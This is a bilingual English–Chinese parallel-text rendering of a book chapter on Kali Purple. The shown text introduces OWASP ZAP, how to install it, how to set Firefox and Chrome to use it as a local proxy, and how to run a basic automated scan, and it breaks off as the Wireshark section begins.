- en: '10'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '10'
- en: Integrating the Red Team and External Tools
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 整合红队与外部工具
- en: As we begin to conclude our introduction to the Kali Purple operating system,
    there are still a few voids here and there that we have to fill. We’ve covered
    a robust suite of blue team tools but not all of the tools this operating system
    has to offer are for cyber defense. In this chapter, we’re going to take a look
    at some tools that are native to Kali Linux from before the Purple distribution
    came into existence. We are also going to look at some very popular red team tools
    that are compatible with Kali Linux but may not necessarily be included in a default
    distribution.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们即将结束对Kali Purple操作系统的介绍时，仍有一些空白需要填补。我们已经介绍了一套强大的蓝队工具，但并非所有这个操作系统提供的工具都用于网络防御。在本章中，我们将探讨一些在Purple发行版出现之前就已经是Kali
    Linux本地工具的内容。我们还将介绍一些非常受欢迎的红队工具，这些工具与Kali Linux兼容，但不一定包含在默认的发行版中。
- en: Hopefully, you’ve invested some time within the cybersecurity community before
    – or at least during – reading this book. If not, please do know that it’s okay
    for you to do that! At any rate, regardless of what independent study you might
    have enjoyed, you’ve probably noticed a few of the same brands being thrown around
    when it comes to certain industry-related toolsets.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 希望在阅读本书之前，或者至少在阅读本书过程中，你已经在网络安全社区中投入了一些时间。如果没有，请记住，这并不影响你现在去做！无论如何，不管你曾经做过多少独立学习，你大概已经注意到在某些行业相关的工具集中，总会出现几个相同的品牌。
- en: A recent poll on the popular professional networking site, LinkedIn, pitted
    many of the more well-known tools against each other in a *March Madness* style
    of competitive bracket and had the community vote on their favorites until a champion
    of sorts was announced. This unscientific and purely fun poll had **Nmap** come
    out on top as the voted-upon favorite with **Burp Suite** a close second place
    and each of the other tools we will discuss in this chapter ranking high – that
    is, **Metasploit**, **Wireshark**, and **Zed Attack** **Proxy** (**ZAP**).
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 最近，在流行的职业社交网站LinkedIn上进行了一项投票，许多知名工具展开了类似*March Madness*的竞技对决，并让社区投票选出它们最喜欢的工具，最终产生了一个“冠军”。这项不具科学性的纯娱乐投票中，**Nmap**作为最受欢迎的工具脱颖而出，**Burp
    Suite**紧随其后，而我们将在本章中讨论的其他工具——**Metasploit**、**Wireshark**和**Zed Attack Proxy**（**ZAP**）也都排名靠前。
- en: Each of these tools has a section dedicated to it, except for Nmap, which will
    be grouped into a section, *Scanners*, that details many different types of scanners.
    It is worth noting that Nmap is also included in **Metasploit** – which might
    make you wonder why Metasploit didn’t win the playful poll. It’s because sometimes,
    people want simplicity and sometimes, they want the entire armory. It’s entirely
    subjective and as you grow in your cyber career, you’ll adjust and sometimes change
    your mind but ultimately begin to develop a style that is unique to you and your
    personality.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 每个工具都有一个专门的章节，除了Nmap，它将被归类到一个名为*扫描器*的章节，该章节详细介绍了多种类型的扫描器。值得注意的是，Nmap也包含在**Metasploit**中——这可能会让你好奇为什么Metasploit没有在那个有趣的投票中获胜。原因是，有时候人们需要简单的工具，有时候则需要完整的武器库。这完全是主观的，随着你在网络安全领域的成长，你会调整甚至改变自己的看法，但最终会发展出一种独特的风格，这种风格将与你的个性密切相关。
- en: 'In this chapter, we’ll cover the following topics:'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主题：
- en: OWASP ZAP
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: OWASP ZAP
- en: Wireshark
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Wireshark
- en: Metasploit
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit
- en: Scanners
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 扫描器
- en: Password-cracking utilities
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 密码破解工具
- en: Burp Suite
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Burp Suite
- en: Technical requirements
  id: totrans-13
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'The requirements for this chapter are as follows:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的要求如下：
- en: '**Minimum requirements**: A computing device with either the *amd64 (x86_64/64-bit)*
    or *i386 (x86/32-bit)* architecture. It should contain at least *8 GB* of RAM.'
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**最低要求**：一台计算设备，具有*amd64 (x86_64/64位)*或*i386 (x86/32位)*架构。至少应包含*8 GB*的RAM。'
- en: '**Recommended requirements**: Based on feedback from cybersecurity field practitioners,
    aim for the *amd64 (x86_64/64-bit)* architecture with *16 GB* of RAM – more is
    better – and up to *64 GB* of additional disk space. Some of the applications
    in this chapter are resource hogs and while they’ll work with the minimum requirements,
    we can’t promise it will be smooth sailing.'
  id: totrans-16
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**推荐要求**：根据网络安全行业从业者的反馈，建议使用*amd64 (x86_64/64位)*架构并配备*16 GB*的RAM——更多的内存更好——以及最多*64
    GB*的额外磁盘空间。本章中的一些应用程序占用资源较多，虽然它们可以在最低要求下运行，但我们不能保证会很顺利。'
- en: OWASP ZAP
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: OWASP ZAP
- en: We’ll begin our journey by exploring a product that was developed by the **Open
    Web Application Security Project** (**OWASP**). This is a nonprofit organization
    that is dedicated to improving the security of software. OWASP is a global community
    that works to create free resources and tools, as well as standards to help organizations
    acquire, develop, and maintain software and web applications with an emphasis
    on security.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将开始探索一个由**开放式网站应用安全项目**（**OWASP**）开发的产品。这是一个致力于改善软件安全性的非营利组织。OWASP 是一个全球社区，致力于创建免费资源和工具，以及标准，以帮助组织获取、开发和维护软件和网站应用程序，并强调安全性。
- en: 'OWASP specializes in generating and raising awareness concerning web application
    security and associated risks. It provides guidance on what it considers best
    practices for building and testing secure web applications. OWASP is known for
    being collaborative and taking an open approach to security, focusing on transparency
    with community-driven initiatives. Some of their activities include developing
    security standards, organizing conferences and events, maintaining a vast repository
    of security knowledge, and supporting various open source projects such as the
    one we are about to discuss: ZAP.'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: OWASP 专注于生成和提高关于网站应用安全及相关风险的意识。它提供建议，认为构建和测试安全网站应用的最佳实践。OWASP 以协作和开放的安全方式而闻名，专注于透明度，并通过社区驱动的倡议。它的一些活动包括开发安全标准、组织会议和活动、维护广泛的安全知识库，并支持各种开源项目，例如我们即将讨论的
    ZAP。
- en: 'One of OWASP’s flagship products, ZAP is an open source web application security
    testing tool that offers a wide range of key features that make it a versatile
    and appealing choice for security professionals. Let’s take a look at what some
    of those features are:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: OWASP 的旗舰产品之一，ZAP 是一个开源的网站应用安全测试工具，提供多种关键功能，使其成为安全专业人员的多功能和吸引人的选择。让我们来看看其中一些功能是什么：
- en: '**Active and passive scanning**: ZAP offers both active and passive scanning
    abilities for identifying potential security vulnerabilities within web applications.
    Active scanning in this context is when ZAP actively sends requests to the target
    application in an attempt to identify such vulnerabilities. Passive scanning,
    on the other hand, is when ZAP monitors the traffic that is already occurring
    between the browser and the target application to detect security vulnerabilities
    without directly interacting with the target application.'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**主动和被动扫描**：ZAP 提供主动和被动扫描功能，用于识别网站应用中的潜在安全漏洞。在这个上下文中，主动扫描是指 ZAP 主动向目标应用发送请求，以识别这些漏洞。另一方面，被动扫描是指
    ZAP 监视浏览器和目标应用之间已经发生的流量，以检测安全漏洞，而无需直接与目标应用交互。'
- en: '**Automated scanning**: ZAP offers automated scanners that scan web applications
    for common vulnerabilities such as **cross-site scripting** (**XSS**) and SQL
    injection. Having automated scanners also generates automatic vulnerability detection.
    Like all automation, this is meant to generate efficiency, saving time and effort.'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**自动化扫描**：ZAP 提供自动化扫描程序，用于扫描网站应用程序中常见的漏洞，如**跨站脚本攻击**（**XSS**）和 SQL 注入。自动化扫描程序还可以自动检测漏洞。像所有自动化一样，这旨在提高效率，节省时间和精力。'
- en: '**Interception and modification of HTTP requests**: ZAP allows users to intercept
    **Hypertext Transfer Protocol** (**HTTP**) requests, a form of information that
    travels between the browser and the application. Users could then manipulate these
    requests and responses to test for security vulnerabilities and misconfigurations.'
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**拦截和修改 HTTP 请求**：ZAP 允许用户拦截**超文本传输协议**（**HTTP**）请求，这是浏览器和应用程序之间传输的信息形式。用户可以操纵这些请求和响应，以测试安全漏洞和配置错误。'
- en: '**Fuzz testing**: Fuzz testing, or **fuzzing**, is a type of testing that allows
    for some randomization on the part of the tester whereby they will attempt to
    introduce invalid or unexpected information as input to an application. An example
    might be responding with letters or special characters when the application is
    expecting a number, or returning a negative number when such a value would be
    illogical in a scenario. ZAP has built-in fuzzing abilities so that users can
    test different parts of HTTP requests to find and identify potential security
    vulnerabilities.'
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**模糊测试**：模糊测试，或称为 **fuzzing**，是一种测试方法，允许测试者对应用程序输入无效或意外的信息。举个例子，当应用程序期待一个数字时，测试者可能会输入字母或特殊字符，或者当某个值在某种情况下不合逻辑时，返回一个负数。ZAP
    具有内置的模糊测试功能，用户可以测试 HTTP 请求的不同部分，以发现并识别潜在的安全漏洞。'
- en: '**Support for scripting**: We’ve talked about scripting several times already.
    It’s a powerful manner of developing automatic behaviors for many of the tools
    we’ve discussed. ZAP supports various scripting languages, including JavaScript,
    Ruby, and Python. While we’ve emphasized Python in this book due to its overwhelming
    popularity and adoption in cybersecurity-related tools, and the profession itself,
    you are not restricted to using that language if you’d like to branch out and
    develop a skillset in a different language. JavaScript has the benefit of also
    being popularly used in website/page development and Ruby has universal uses as
    well.'
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**脚本支持**：我们已经多次讨论过脚本。它是一种强大的方式，可以为我们讨论的许多工具开发自动化行为。ZAP 支持多种脚本语言，包括 JavaScript、Ruby
    和 Python。尽管本书重点介绍 Python，因为它在网络安全相关工具和行业中有着广泛的使用和接受，但如果你希望扩展并在其他语言中发展技能，你并不局限于使用
    Python。JavaScript 的好处在于它在网站/页面开发中也被广泛使用，而 Ruby 也有广泛的应用。'
- en: '**REST API**: We explained what both REST and API mean near the beginning of
    [*Chapter 8*](B21223_08.xhtml#_idTextAnchor134) when we discussed **Cortex**.
    Refer to that section if you’d like a refresher. In short, these concepts allow
    for integration between different technologies. In other words, ZAP supports the
    REST API so that other applications can use it to integrate with their workflows
    and **continuous integration/continuous deployment** (**CI/CD**) pipelines.'
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**REST API**：我们在 [*第 8 章*](B21223_08.xhtml#_idTextAnchor134) 开头解释了 REST 和 API
    的含义，那个时候我们讨论了 **Cortex**。如果你需要复习，可以参考那一部分。简而言之，这些概念允许不同技术之间的集成。换句话说，ZAP 支持 REST
    API，使得其他应用可以使用它来与它们的工作流和 **持续集成/持续部署**（**CI/CD**）管道进行集成。'
- en: '**Support for authentication**: ZAP is particularly useful in testing the authentication
    aspects of an application. It provides support for testing through mechanisms
    such as form-based authentication, HTTP authentication, and client certificate
    authentication. There are authentication configuration settings within ZAP that
    users can use to test these aspects of an application.'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**认证支持**：ZAP 在测试应用程序的认证方面特别有用。它提供了通过诸如表单认证、HTTP 认证和客户端证书认证等机制进行测试的支持。ZAP 内部有认证配置设置，用户可以使用这些设置来测试应用程序的这些方面。'
- en: ZAP should already be installed within your Kali Purple instance. To make sure,
    let’s go through the motions of quickly grabbing a copy; if it’s already installed,
    Kali will let us know. If not, we’ll get our copy. Alternatively, we can select
    the Kali dragon icon in the top-left corner of our environment and either type
    **ZAP** in the search bar or scroll down and highlight **Identify** and then move
    our cursor to the newly expanded column on the right-hand side. Once we’ve done
    this, we can scroll near the bottom to find and click on the **ZAP** option.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: ZAP 应该已经安装在你的 Kali Purple 实例中了。为了确认，我们可以快速检查一下；如果已经安装，Kali 会告诉我们。如果没有，我们可以选择环境左上角的
    Kali 龙图标，然后在搜索栏中输入 **ZAP**，或者向下滚动并高亮 **Identify**，然后将光标移到右侧新展开的列中。完成这些操作后，我们可以向下滚动，找到并点击
    **ZAP** 选项。
- en: Type **sudo apt update**; if the results suggest that you upgrade, type **sudo
    apt upgrade** to install them. Once you’re finished, type **sudo apt install zaproxy**
    to formally install ZAP.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 输入 **sudo apt update**；如果结果提示你进行升级，输入 **sudo apt upgrade** 进行安装。完成后，输入 **sudo
    apt install zaproxy** 来正式安装 ZAP。
- en: 'Let’s launch the application. To do that, type **zaproxy**. You will be asked
    whether you want to persist the session. The decision is yours:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们启动应用程序。为此，输入 **zaproxy**。系统会询问你是否希望保存会话。决定权在你：
- en: '![Figure 10.1 – ZAP launch screen – request to persist](image/B21223_10_01.jpg)'
  id: totrans-31
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.1 – ZAP 启动屏幕 – 请求持久化](image/B21223_10_01.jpg)'
- en: Figure 10.1 – ZAP launch screen – request to persist
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.1 – ZAP 启动屏幕 – 请求持久化
- en: Persisting the session means preserving the state of ZAP as you left it. It
    saves the state of the application, including all configurations, settings, data,
    and activities, so that you can access and resume those activities later. Examples
    of such settings may include scan results, whether active or passive, so that
    they include any identified vulnerabilities, warnings, or other findings, any
    information that was intercepted while proxying HTTP requests and responses, such
    as headers, parameters, cookies, and content, as well as any session requests
    that were made, scripts that were executed, or credentials and tokens that were
    saved.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 持久化会话意味着保持 ZAP 当前的状态。它会保存应用程序的状态，包括所有配置、设置、数据和活动，以便稍后可以访问并恢复这些活动。这些设置可能包括扫描结果，无论是主动还是被动的，可能会包括任何已识别的漏洞、警告或其他发现、代理
    HTTP 请求和响应时截获的任何信息，例如头部、参数、cookie 和内容，以及保存的任何会话请求、执行的脚本或保存的凭据和令牌。
- en: 'ZAP has its own internal package updater. Whether you wish to use it is up
    to you. We are going to select the **Update All** button at the bottom right of
    the window:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: ZAP 有自己的内部包更新器。是否使用它取决于你。我们将在窗口右下角选择**全部更新**按钮：
- en: '![Figure 10.2 – ZAP launch screen – request to persist](image/B21223_10_02.jpg)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.2 – ZAP 启动屏幕 – 请求持久化](image/B21223_10_02.jpg)'
- en: Figure 10.2 – ZAP launch screen – request to persist
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.2 – ZAP 启动屏幕 – 请求持久化
- en: To use ZAP, you must configure your browser so that it can use ZAP as a proxy.
    We’ve provided instructions for doing so for both Mozilla Firefox and Google Chrome
    because they are the two most likely web browsers you’ll experience in Kali Linux.
    If you wish to use a different browser, a simple web search should help.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用 ZAP，必须配置浏览器使其能够使用 ZAP 作为代理。我们为 Mozilla Firefox 和 Google Chrome 提供了配置说明，因为它们是你在
    Kali Linux 中最常用的浏览器。如果你希望使用其他浏览器，简单的网页搜索应该能帮到你。
- en: Mozilla Firefox
  id: totrans-38
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Mozilla Firefox
- en: 'Follow these steps to configure Mozilla Firefox to use ZAP:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 按照以下步骤配置 Mozilla Firefox 使用 ZAP：
- en: Launch Mozilla Firefox within your Kali Purple environment.
  id: totrans-40
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Kali Purple 环境中启动 Mozilla Firefox。
- en: Open the hamburger menu at the top right.
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开右上角的汉堡菜单。
- en: 'Select **Settings** from the drop-down menu, as shown in *Figure 10**.3*:'
  id: totrans-42
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从下拉菜单中选择**设置**，如*图 10.3*所示：
- en: '![Figure 10.3 – Configuring Firefox as a proxy](image/B21223_10_03.jpg)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.3 – 配置 Firefox 作为代理](image/B21223_10_03.jpg)'
- en: Figure 10.3 – Configuring Firefox as a proxy
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.3 – 配置 Firefox 作为代理
- en: Scroll the main window until you reach the **Network** **Settings** section.
  id: totrans-45
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 向下滚动主窗口，直到看到**网络** **设置**部分。
- en: 'Select the **Settings…** button, as shown in *Figure 10**.4*:'
  id: totrans-46
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**设置…**按钮，如*图 10.4*所示：
- en: '![Figure 10.4 – Accessing Firefox’s network settings](image/B21223_10_04.jpg)'
  id: totrans-47
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.4 – 访问 Firefox 的网络设置](image/B21223_10_04.jpg)'
- en: Figure 10.4 – Accessing Firefox’s network settings
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.4 – 访问 Firefox 的网络设置
- en: Select the **Manual proxy configuration** radio button.
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**手动代理配置**单选按钮。
- en: Enter the host IP address in the **HTTP Proxy** field – in our case, **127.0.0.1**
    – and enter **8080** as the value for **Port**.
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**HTTP 代理**字段中输入主机 IP 地址——在我们的例子中是**127.0.0.1**——并在**端口**中输入**8080**作为值。
- en: Select the **Also use this proxy for** **HTTPS** box.
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**也为 HTTPS 使用此代理**框。
- en: 'Select **OK** in the bottom-right corner of the pop-up window:'
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在弹出窗口的右下角选择**确定**：
- en: '![Figure 10.5 – Adding Firefox proxy settings](image/B21223_10_05.jpg)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.5 – 添加 Firefox 代理设置](image/B21223_10_05.jpg)'
- en: Figure 10.5 – Adding Firefox proxy settings
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.5 – 添加 Firefox 代理设置
- en: Now, let’s look at Google Chrome.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们来看一下 Google Chrome。
- en: Google Chrome
  id: totrans-56
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Google Chrome
- en: 'Follow these steps to configure Google Chrome to use ZAP:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 按照以下步骤配置 Google Chrome 使用 ZAP：
- en: Launch Google Chrome within your Kali Purple environment
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Kali Purple 环境中启动 Google Chrome
- en: Select the vertical ellipses – that is, the three dots at the top right of the
    Chrome browser.
  id: totrans-59
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择竖向省略号——即 Chrome 浏览器右上角的三个点。
- en: 'Select **Settings** from the drop-down menu, as shown in *Figure 10**.6*:'
  id: totrans-60
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从下拉菜单中选择**设置**，如*图 10.6*所示：
- en: '![Figure 10.6 – Configuring Google Chrome as a proxy](image/B21223_10_06.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.6 – 配置 Google Chrome 作为代理](image/B21223_10_06.jpg)'
- en: Figure 10.6 – Configuring Google Chrome as a proxy
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.6 – 配置 Google Chrome 作为代理
- en: In the left column, scroll down until you see **System** and select it.
  id: totrans-63
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在左侧栏中，向下滚动直到看到**系统**，然后选择它。
- en: 'The main window will include new options. Select **Open your computer’s** **proxy
    settings**:'
  id: totrans-64
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 主窗口将显示新的选项。选择**打开计算机的** **代理设置**：
- en: '![Figure 10.7 – Accessing Chrome’s proxy settings](image/B21223_10_07.jpg)'
  id: totrans-65
  prefs: []
  type: TYPE_IMG
  zh: '![图10.7 – 访问Chrome的代理设置](image/B21223_10_07.jpg)'
- en: Figure 10.7 – Accessing Chrome’s proxy settings
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.7 – 访问Chrome的代理设置
- en: In the **Proxy** section, for **Automatically detect settings**, select the
    toggle button so that it says **Off**, as shown in the top right of *Figure 10**.8*.
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**代理**部分，对于**自动检测设置**，选择开关按钮，使其显示为**关闭**，如*图10.8*右上角所示。
- en: 'For the **Use a proxy server** field, select **Set up**:'
  id: totrans-68
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对于**使用代理服务器**字段，选择**设置**：
- en: '![Figure 10.8 – Chrome’s auto-detect settings](image/B21223_10_08.jpg)'
  id: totrans-69
  prefs: []
  type: TYPE_IMG
  zh: '![图10.8 – Chrome的自动检测设置](image/B21223_10_08.jpg)'
- en: Figure 10.8 – Chrome’s auto-detect settings
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.8 – Chrome的自动检测设置
- en: In the pop-up box, select the toggle button for **Use a proxy server** so that
    it says **On**.
  id: totrans-71
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在弹出框中，选择**使用代理服务器**的开关按钮，使其显示为**开启**。
- en: Enter the host IP address in the **Proxy IP address** field – in our case, **127.0.0.1**
    – and enter **8080** as the value for **Port**.
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**代理IP地址**字段中输入主机的IP地址 – 在我们的例子中是**127.0.0.1** – 并在**端口**字段中输入**8080**。
- en: 'Select **Save** in the bottom-left corner of the pop-up window:'
  id: totrans-73
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在弹出窗口的左下角选择**保存**：
- en: '![Figure 10.9 – Accessing Chrome’s proxy settings](image/B21223_10_09.jpg)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![图10.9 – 访问Chrome的代理设置](image/B21223_10_09.jpg)'
- en: Figure 10.9 – Accessing Chrome’s proxy settings
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.9 – 访问Chrome的代理设置
- en: 'Regardless of which browser you wish to use, ensure you close the browser window
    entirely when you’re finished and return to your ZAP instance. In the main window,
    as shown in *Figure 10**.10*, you will notice four tiles you can choose from.
    These are **Automated Scan**, **Manual Explore**, **Support**, and **Learn More**.
    We highly encourage you to invest some time clicking through the links within
    **Support** and **Learn More** to get a grasp of how ZAP works. For proof-of-concept,
    let’s set up and run a quick automated scan:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 无论您希望使用哪个浏览器，确保在完成后完全关闭浏览器窗口，并返回到您的ZAP实例。在主窗口中，如*图10.10*所示，您将看到可以选择的四个选项卡。它们是**自动扫描**、**手动探索**、**支持**和**了解更多**。我们强烈建议您花一些时间点击**支持**和**了解更多**中的链接，以了解ZAP的工作原理。为了证明概念，让我们设置并运行一个快速的自动扫描：
- en: Select the **Manual** **Explore** tile.
  id: totrans-77
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**手动** **探索**瓷砖。
- en: Add the URL address for **HTTP Proxy** that we added in the preceding step.
    In our case, it’s **http://127.0.0.1:8080**.
  id: totrans-78
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在前一步中添加的**HTTP代理**的URL地址添加到此处。在我们的例子中，它是**http://127.0.0.1:8080**。
- en: Select the **Enable** **HUD** checkbox.
  id: totrans-79
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选中**启用** **HUD**复选框。
- en: Ensure either the Firefox or Chrome browser is selected in the drop-down menu
    to the right of the **Launch** **Browser** button.
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确保在**启动** **浏览器**按钮右侧的下拉菜单中选择了Firefox或Chrome浏览器。
- en: 'Click the **Launch** **Browser** button:'
  id: totrans-81
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**启动** **浏览器**按钮：
- en: '![Figure 10.10 – Setting an attack target and launching the browser proxy](image/B21223_10_10.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![图10.10 – 设置攻击目标并启动浏览器代理](image/B21223_10_10.jpg)'
- en: Figure 10.10 – Setting an attack target and launching the browser proxy
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.10 – 设置攻击目标并启动浏览器代理
- en: Select the left angle bracket at the top left of the screen – highlighted in
    *Figure 10**.10* – to return to the main screen.
  id: totrans-84
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择屏幕左上角的左尖括号 – 如*图10.10*所示 – 返回主屏幕。
- en: Choose and select the **Automated** **Scan** tile.
  id: totrans-85
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择并点击**自动** **扫描**瓷砖。
- en: Enter the same URL you entered in the preceding step for the **URL to** **attack**
    field.
  id: totrans-86
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**攻击**字段中输入与前一步相同的URL地址。
- en: Ensure the **Use traditional spider** field is checked.
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确保勾选**使用传统蜘蛛**字段。
- en: 'Select the **Attack** button. You should see a window – under **Sent Messages**
    – begin to populate with your automated scanning activity, as shown in *Figure
    10**.11*:'
  id: totrans-88
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**攻击**按钮。您应该会看到一个窗口 – 在**已发送消息**下 – 开始显示您的自动扫描活动，如*图10.11*所示：
- en: '![Figure 10.11 – Setting the attack target and launching the browser proxy](image/B21223_10_11.jpg)'
  id: totrans-89
  prefs: []
  type: TYPE_IMG
  zh: '![图10.11 – 设置攻击目标并启动浏览器代理](image/B21223_10_11.jpg)'
- en: Figure 10.11 – Setting the attack target and launching the browser proxy
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.11 – 设置攻击目标并启动浏览器代理
- en: 'In this section, we talked about OWASP’s flagship product, ZAP, and how it’s
    used for web application testing. However, testing the applications themselves
    is only part of the overall cybersecurity puzzle. If you were to be on the receiving
    end of an attack, analyzing the type of traffic might lead you to discover the
    attacker’s potential tools through packet examination. You may also discover known
    patterns or styles to help identify who is attacking or a particular method of
    attack. Each of these things can help narrow down the objective of the attacker
    and therefore help pinpoint where the vulnerability that might be actively exploited
    lies. In the next section, we’re going to cover a well-known tool that’s designed
    to take apart these communication packets and study them: Wireshark.'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们讨论了OWASP的旗舰产品ZAP以及它在Web应用程序测试中的使用。然而，测试应用程序本身只是整体网络安全难题的一部分。如果你是攻击的接收方，分析流量类型可能会让你通过数据包检查发现攻击者可能使用的工具。你还可能发现已知的攻击模式或方式，帮助识别攻击者身份或特定的攻击方法。这些信息有助于缩小攻击者的目标范围，从而帮助定位可能被恶意利用的漏洞所在。在下一节中，我们将介绍一个著名的工具，它旨在拆解这些通信数据包并对其进行研究：Wireshark。
- en: Wireshark
  id: totrans-92
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Wireshark
- en: 'We’ve talked about Wireshark several times throughout this book. It is arguably
    the most popular network protocol analyzer utility within the world of networking
    and cybersecurity in use today. This tool allows its users to capture and interactively
    navigate through the traffic running on a computer network. However, its uses
    go beyond simple vulnerability and threat identification. Network administrators
    can use it to monitor traffic behavior and conditions to troubleshoot any performance
    issues and/or anomalous behavior, even if it’s not related to vulnerabilities
    or malicious activity. Here’s a high-level overview of Wireshark’s key features:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 本书中我们多次提到Wireshark，它无疑是当今网络和网络安全领域中最受欢迎的网络协议分析工具。该工具允许用户捕获并交互式地浏览计算机网络中的流量。然而，它的用途不仅限于简单的漏洞和威胁识别。网络管理员可以使用它监控流量行为和状态，以解决性能问题和/或异常行为，即使这些问题与漏洞或恶意活动无关。以下是Wireshark主要功能的高层次概述：
- en: '**Packet analysis**: In short, Wireshark captures packets of information on
    a network and displays them in a readable format, allowing users to analyze the
    content of each packet in depth.'
  id: totrans-94
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
